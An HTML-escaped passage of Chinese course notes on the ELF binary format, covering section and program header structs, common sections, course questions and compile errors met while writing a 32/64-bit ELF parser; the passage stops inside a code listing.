&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/* Section header.  */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_name;        /* Section name (string tbl index) */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_type;        /* Section type */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_flags;       /* Section flags */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  sh_addr;        /* Section virtual addr at execution */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Off   sh_offset;      /* Section file offset */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_size;        /* Section size in bytes */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_link;        /* Link to another section */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_info;        /* Additional section information */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_addralign;       /* Section alignment */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  sh_entsize;     /* Entry size if section holds table */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Shdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_name;        /* Section name (string tbl index) */ 名称,值是在string表的索引&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_type;        /* Section type */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_flags;       /* Section flags */  标记属性 读写执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Addr  sh_addr;        /* Section virtual addr at execution */   虚拟地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Off   sh_offset;      /* Section file offset */			在文件中的偏移&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_size;        /* Section size in bytes */			大小&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_link;        /* Link to another section */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Word  sh_info;        /* Additional section information */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_addralign;       /* Section alignment */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf64_Xword sh_entsize;     /* Entry size if section holds table */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Shdr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;sh-name&#34;&gt;&lt;a href=&#34;#sh-name&#34; class=&#34;headerlink&#34; title=&#34;sh_name&#34;&gt;&lt;/a&gt;sh_name&lt;/h3&gt;&lt;p&gt;​		这里存储的是节名的下标,节名实际存在于.shstrtab中,这里存的是在shstrtab中的下标.&lt;/p&gt;
&lt;h2 id=&#34;节-section&#34;&gt;&lt;a href=&#34;#节-section&#34; class=&#34;headerlink&#34; title=&#34;节 section&#34;&gt;&lt;/a&gt;节 section&lt;/h2&gt;&lt;h3 id=&#34;text节&#34;&gt;&lt;a href=&#34;#text节&#34; class=&#34;headerlink&#34; title=&#34;.text节&#34;&gt;&lt;/a&gt;.text节&lt;/h3&gt;&lt;p&gt;​		保存了程序代码指令的代码节. 一段可执行程序如果存在Phdr, .text字节就会存在于text段中(&lt;font color=&#34;red&#34;&gt;如果不存在呢??&lt;/font&gt;)&lt;/p&gt;
&lt;h3 id=&#34;rodata节&#34;&gt;&lt;a href=&#34;#rodata节&#34; class=&#34;headerlink&#34; title=&#34;.rodata节&#34;&gt;&lt;/a&gt;.rodata节&lt;/h3&gt;&lt;p&gt;​		保存只读数据,如一行c语言代码中的字符串  printf(“hello world\n”); 因为是只读,所以也放到了text段&lt;/p&gt;
&lt;h3 id=&#34;data节&#34;&gt;&lt;a href=&#34;#data节&#34; class=&#34;headerlink&#34; title=&#34;.data节&#34;&gt;&lt;/a&gt;.data节&lt;/h3&gt;&lt;p&gt;​		保存了初始的全局变量等数据.存在于data段&lt;/p&gt;
&lt;h3 id=&#34;bss节&#34;&gt;&lt;a href=&#34;#bss节&#34; class=&#34;headerlink&#34; title=&#34;.bss节&#34;&gt;&lt;/a&gt;.bss节&lt;/h3&gt;&lt;p&gt;​		保存了未进行初始化的全局数据,存在于data段.&lt;/p&gt;
&lt;h3 id=&#34;plt&#34;&gt;&lt;a href=&#34;#plt&#34; class=&#34;headerlink&#34; title=&#34;.plt&#34;&gt;&lt;/a&gt;.plt&lt;/h3&gt;&lt;p&gt;​		包含了动态链接器调用从共享库导入的函数所必需的相关代码. 存在于text段中,同样保存了代码.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230303132136453.png&#34; alt=&#34;image-20230303132136453&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;got&#34;&gt;&lt;a href=&#34;#got&#34; class=&#34;headerlink&#34; title=&#34;.got&#34;&gt;&lt;/a&gt;.got&lt;/h3&gt;&lt;p&gt;​		保存了全局偏移表.这个存的是变量&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230228164021947.png&#34; alt=&#34;image-20230228164021947&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;got-plt&#34;&gt;&lt;a href=&#34;#got-plt&#34; class=&#34;headerlink&#34; title=&#34;.got.plt&#34;&gt;&lt;/a&gt;.got.plt&lt;/h3&gt;&lt;p&gt;​		这个存的是函数引用&lt;/p&gt;
&lt;h3 id=&#34;dynsym&#34;&gt;&lt;a href=&#34;#dynsym&#34; class=&#34;headerlink&#34; title=&#34;.dynsym&#34;&gt;&lt;/a&gt;.dynsym&lt;/h3&gt;&lt;p&gt;​		保存了从共享库导入的动态符号信息,该节保存在text段中&lt;/p&gt;
&lt;h3 id=&#34;dynstr&#34;&gt;&lt;a href=&#34;#dynstr&#34; class=&#34;headerlink&#34; title=&#34;.dynstr&#34;&gt;&lt;/a&gt;.dynstr&lt;/h3&gt;&lt;p&gt;​		保存了动态符号字符串表,表中存放了一系列字符串,这些字符串表示符号的名称,以空字符00作为终止符&lt;/p&gt;
&lt;h2 id=&#34;ELF程序头-phdr-segment段&#34;&gt;&lt;a href=&#34;#ELF程序头-phdr-segment段&#34; class=&#34;headerlink&#34; title=&#34;ELF程序头 phdr (segment段)&#34;&gt;&lt;/a&gt;ELF程序头 phdr (segment段)&lt;/h2&gt;&lt;p&gt;​		程序头中描述了可执行文件的段信息,即程序如何加载到内存以及内存中的布局.&lt;/p&gt;
&lt;p&gt;​		程序头可以通过elf文件头的e_phoff（程序头表偏移量）字段来得到位置&lt;/p&gt;
&lt;p&gt;​		它主要有5种类型&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Program segment header.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_type;         &lt;span class=&#34;comment&#34;&gt;/* Segment type */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Off   p_offset;       &lt;span class=&#34;comment&#34;&gt;/* Segment file offset */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  p_vaddr;        &lt;span class=&#34;comment&#34;&gt;/* Segment virtual address */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Addr  p_paddr;        &lt;span class=&#34;comment&#34;&gt;/* Segment physical address */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_filesz;       &lt;span class=&#34;comment&#34;&gt;/* Segment size in file */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_memsz;        &lt;span class=&#34;comment&#34;&gt;/* Segment size in memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_flags;        &lt;span class=&#34;comment&#34;&gt;/* Segment flags , I.E execute|read|write */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Elf32_Word  p_align;        &lt;span class=&#34;comment&#34;&gt;/* Segment alignment */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf32_Phdr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Word	p_type;    &lt;span class=&#34;comment&#34;&gt;//类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Word	p_flags;   &lt;span class=&#34;comment&#34;&gt;// 读写执行权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Off	p_offset;   &lt;span class=&#34;comment&#34;&gt;//文件中的偏移&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Addr	p_vaddr;  &lt;span class=&#34;comment&#34;&gt;//虚拟地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Addr	p_paddr;  &lt;span class=&#34;comment&#34;&gt;//物理地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_filesz; &lt;span class=&#34;comment&#34;&gt;//在文件中的大小	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_memsz;	&lt;span class=&#34;comment&#34;&gt;//在内存中的大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	Elf64_Xword	p_align;  &lt;span class=&#34;comment&#34;&gt;//&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; Elf64_Phdr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;PT-LOAD&#34;&gt;&lt;a href=&#34;#PT-LOAD&#34; class=&#34;headerlink&#34; title=&#34;PT_LOAD&#34;&gt;&lt;/a&gt;PT_LOAD&lt;/h3&gt;&lt;p&gt;​		一个可执行文件至少有一个该类型的段.PT_LOAD表述的是可装载的段,这种类型的段会被装载或者映射到内存中,&lt;/p&gt;
&lt;h2 id=&#34;编译器如何对节段进行组织安排&#34;&gt;&lt;a href=&#34;#编译器如何对节段进行组织安排&#34; class=&#34;headerlink&#34; title=&#34;编译器如何对节段进行组织安排&#34;&gt;&lt;/a&gt;编译器如何对节段进行组织安排&lt;/h2&gt;&lt;p&gt;​		这里所说的是编译环节,从源代码到二进制文件.&lt;/p&gt;
&lt;h2 id=&#34;ELF装载过程&#34;&gt;&lt;a href=&#34;#ELF装载过程&#34; class=&#34;headerlink&#34; title=&#34;ELF装载过程&#34;&gt;&lt;/a&gt;ELF装载过程&lt;/h2&gt;&lt;p&gt;​		这里是指把二进制文件加载进内存的过程&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;h2 id=&#34;一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义&#34;&gt;&lt;a href=&#34;#一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义&#34; class=&#34;headerlink&#34; title=&#34;一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义&#34;&gt;&lt;/a&gt;一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221121391.png&#34; alt=&#34;image-20230323221121391&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;编译器如何对这些段进行编排和组织-顺序是否可以任意调换&#34;&gt;&lt;a href=&#34;#编译器如何对这些段进行编排和组织-顺序是否可以任意调换&#34; class=&#34;headerlink&#34; title=&#34;编译器如何对这些段进行编排和组织,顺序是否可以任意调换&#34;&gt;&lt;/a&gt;编译器如何对这些段进行编排和组织,顺序是否可以任意调换&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221148505.png&#34; alt=&#34;image-20230323221148505&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34;&gt;&lt;a href=&#34;#是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34; class=&#34;headerlink&#34; title=&#34;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&#34;&gt;&lt;/a&gt;是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221203956.png&#34; alt=&#34;image-20230323221203956&#34;&gt;&lt;/p&gt;
&lt;p&gt;文件头52????&lt;/p&gt;
&lt;p&gt;magic number16字节 还剩36字节 &lt;/p&gt;
&lt;p&gt;8*2 + 4 * 2 + 4 + 4 * 2 &amp;#x3D; 36&lt;/p&gt;
&lt;p&gt;0x3e &amp;#x3D; 62 &lt;/p&gt;
&lt;h1 id=&#34;测试&#34;&gt;&lt;a href=&#34;#测试&#34; class=&#34;headerlink&#34; title=&#34;测试&#34;&gt;&lt;/a&gt;测试&lt;/h1&gt;&lt;p&gt;删除一些段,程序是否还能正常运行? 程序必须的段 节是哪些??&lt;/p&gt;
&lt;p&gt;怎么增删改text段等 欺骗编译器等&lt;/p&gt;
&lt;h1 id=&#34;代码编写&#34;&gt;&lt;a href=&#34;#代码编写&#34; class=&#34;headerlink&#34; title=&#34;代码编写&#34;&gt;&lt;/a&gt;代码编写&lt;/h1&gt;&lt;p&gt;自己也要编译成32位才行&lt;/p&gt;
&lt;p&gt;gcc -m32 1.c &amp;amp;&amp;amp; .&amp;#x2F;a.out test&lt;/p&gt;
&lt;p&gt;可以参考readelf&lt;/p&gt;
&lt;p&gt;先把32位的都给写好,然后再加上64位的&lt;/p&gt;
&lt;p&gt;1.改进,32位 64位,根据文件头判断,然后再进行解析&lt;/p&gt;
&lt;p&gt;解析段和节,名称 起始和结束位置, 大小,权限&lt;/p&gt;
&lt;p&gt;fatal error: elf32.h: No such file or directory&lt;br&gt; #include &amp;lt;elf32.h&amp;gt;&lt;/p&gt;
&lt;p&gt;fatal error: bits&amp;#x2F;libc-header-start.h: No such file or directory&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili&#34;&gt;https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;e_ident 怎么输出多位, c&lt;/p&gt;
&lt;p&gt;怎么定义空格字符呢?&lt;/p&gt;
&lt;p&gt;gcc -m32 1.c  需要编译成32位的,目前也只能解析32位程序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span 